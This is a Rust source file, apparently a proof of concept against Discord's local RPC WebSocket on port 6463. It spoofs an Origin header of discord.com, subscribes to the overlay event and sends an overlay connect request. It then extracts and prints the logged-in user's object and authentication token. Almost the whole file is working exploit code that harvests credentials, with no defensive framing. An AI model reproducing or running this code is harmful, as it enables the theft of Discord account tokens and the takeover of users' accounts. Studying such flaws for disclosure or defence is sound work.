use std::{collections::vec_deque, process::exit, vec};

use http::header::VacantEntry;
use protocol::WebSocketConfig;
use tungstenite::{client, http::{self, Request, request}, protocol};
use serde::{Deserialize, Serialize};
use serde_json::json;
use uuid::Uuid;
use serde_json::Value;

fn main() {

    const URL: &str = "ws://127.0.0.1:6463/?v=1&encoding=json";

    let mut packet_numbers= 0;

    let request = Request::builder()
        .uri(URL)
        .header("Origin", "https://discord.com")
        .body(())
        .unwrap();

    let config = Some(protocol::WebSocketConfig {
        max_send_queue: (Some(99999)),
        max_message_size: (Some(999999999)),
        max_frame_size: (Some(999999999999)),
        accept_unmasked_frames: (true),
        
    });

    let (mut socket, response) = client::connect_with_config(request, config, 0).expect("Cannot connect to socket");

    println!("Successfully connected to socket");

    loop {
        let msg = socket.read_message().expect("Error trying to read message");

        if msg.is_empty() { 
            continue;
        }

        let json: Value = serde_json::from_str(&msg.clone().into_text().unwrap()).unwrap();


        if json["evt"] == "READY" {
            println!("Ready message received: {}", msg.clone());

            let mut message = json!({
                "cmd": "SUBSCRIBE",
                "args": {},
                "evt": "OVERLAY",
                "nonce": Uuid::new_v4()
            });

            socket.write_message(tungstenite::Message::Text(message.to_string())).unwrap();

            println!("Sent subcribe message");

            message = json!({
                "cmd": "OVERLAY",
                "args": {
                    "type": "CONNECT",
                    "pid": 4 
                },
                "nonce": Uuid::new_v4(),
            });

            socket.write_message(tungstenite::Message::Text(message.to_string())).unwrap();

            println!("Sent connect message");

        }

        if json["cmd"] == "DISPATCH" && json["data"]["type"] == "DISPATCH" && json["data"]["pid"] == 4 {

            println!("Got payload packet, reading out, size: {:?}kb.", msg.len() / 1024);


            let payload = &json["data"]["payloads"][0];
            let user = &payload["users"][0];
            let token = &payload["token"];

            
             
            println!("User: {:?}, token: {:?}", user, token);

            println!("Got {} wrong packets before POC worked", packet_numbers);

            exit(0);
        } else { packet_numbers = packet_numbers + 1 }

        
 


        
    }


    
}
